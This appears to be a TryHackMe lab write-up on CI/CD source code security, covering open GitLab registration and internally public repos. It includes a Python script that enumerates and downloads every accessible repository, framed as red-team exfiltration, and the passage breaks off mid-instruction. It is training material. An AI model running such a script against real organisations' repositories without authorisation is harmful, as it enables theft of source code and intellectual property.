## Source Code Security  

As mentioned in the [Introduction to Pipeline Automation](http://tryhackme.com/jr/introtopipelineautomation) and [Source Code Security](https://tryhackme.com/room/sourcecodesecurity) rooms, the first step to securing the pipeline and the build is to secure the source. In the event that a threat actor can compromise the source of our build, they are in a position to compromise the build itself. We want to protect our source code from the following two main issues:

- **Unauthorised Tampering** - This is the simplest issue of the two. Only authorised users should be able to make changes to the source code. This means that we want to control who has the ability to push new code to our repo.
- **Unauthorised Disclosure** - This is a bit more tricky. Depending on the application, the source code itself might be considered sensitive. For example, Microsoft would not like to disclose the source code of Word since that is their intellectual property. In cases where the source code is sensitive, we must ensure we do not intentionally disclose it. This issue is a lot more common to find.

## Confusion of responsibilities  

Let's take a look at exploiting an insecure build source. A common mistake made in large organisations is believing that the perimeter is a sufficient security boundary. Although the perimeter plays a role, it should not be seen as the only boundary. Granular access control on the internal network should be implemented as well. This false belief can lead to interesting misconfigurations. Let's take a look at a practical example.

Some organisations are incredibly large and have multiple teams and business units responsible for different things. If we take an organisation such as a bank, many different teams and units work together to run the bank. Furthermore, in large organisations like this, it isn't as simple as just saying that we have an "IT" business unit, as there may be several teams working on many different IT and development projects within the bank, using a wide range of coding languages, CI/CD pipelines, and build frameworks. Such large organisations may choose to host their source code internally since much of that development may be intellectual property (IP). While we would hope that access to the various source code repos would be managed granularly, mistakes do creep in.

One such mistake is that organisations can leave registration for their Gitlab instance open. Not open to the internet (although this has also happened before), but open to any user on their internal network to register a profile. This was simulated in the previous task by allowing you to register your own Gitlab profile.

Some would consider this not to be a direct risk, but let's look at how the attack surface grows. Our example bank organisation might have 10,000 employees, of which 2000 may be working as developers and need access to Gitlab. In essence, our attack surface has grown by 500%! If a single employee of our bank is compromised, an attacker would have the ability to register a profile and exfiltrate any publicly shared repos.

This is the second misconfiguration that comes into play. Developers of our bank may believe that because the Gitlab instance is only accessible internally, it is okay to configure repos to be shared publicly. This means that any user who has a valid Gitlab account will be able to view the repo. While they may perhaps not be able to alter the code, remember, in this example, the code itself is seen as the IP of the bank. This confusion between who is responsible for securing the source code can lead to sensitive information being disclosed to the threat actor. Let's take a look at how this can be exploited!

## Exploiting a vulnerable build source

You have already registered a profile on the GitLab instance. While you can use manual enumeration to find sensitive information in repos, where you are on a red team, you will need to automate this process to ensure stealth and efficiency. We will not be teaching both in this task for obvious reasons, so let's look at how we can make the process efficient. To efficiently enumerate publicly visible repos, we will make use of the Gitlab API and a Python script as follows:

```
import gitlab
import uuid

# Create a Gitlab connection
gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='REPLACE_ME')
gl.auth()

# Get all Gitlab projects
projects = gl.projects.list(all=True)

# Enumerate through all projects and try to download a copy
for project in projects:
    print ("Downloading project: " + str(project.name))
    #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
    UID = str(uuid.uuid4())
    print (UID)
    try:
        repo_download = project.repository_archive(format='zip')
        with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
            output_file.write(repo_download)
    except Exception as e:
        # Based on permissions, we may not be able to download the project
        print ("Error with this download")
        print (e)
        pass
```

>[!Note]
>Make sure to install the Gitlab pip package using `pip3 install python-gitlab==3.15.0`.

As mentioned before, the script provided is not stealthy. Rather than first determining which repos are publicly available, it recovers the entire list of all repos and attempts to download each of them. This shows an example of how a threat actor can quickly and easily recover all publicly available repos. Feel free to play around with the script to introduce stealth.

As you will see, line 5 of the script requires a Gitlab authentication token. Gitlab does not allow for its API to be interfaced with using credentials, as this is deemed insecure. Therefore, to use the script, we will first have to generate an API token for our account. Authenticate to the Gitlab server and perform the following steps:

